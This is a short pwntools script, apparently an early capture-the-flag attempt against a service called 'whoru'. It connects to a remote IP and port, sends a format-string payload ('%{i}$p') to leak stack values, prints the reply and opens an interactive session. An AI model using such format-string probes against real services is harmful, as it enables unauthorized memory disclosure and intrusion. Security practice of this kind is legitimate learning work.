from pwn import *

elf = ELF("./service/whoru")

for i in range(100):
    p = remote("103.37.125.237", 10002)
    p.sendlineafter(b"Kamu siapa? dimana rumahnya? hei!", f"%{i}$p")
    # p.recvline()
    result = p.recvline()
    print(result)
    break
p.interactive()
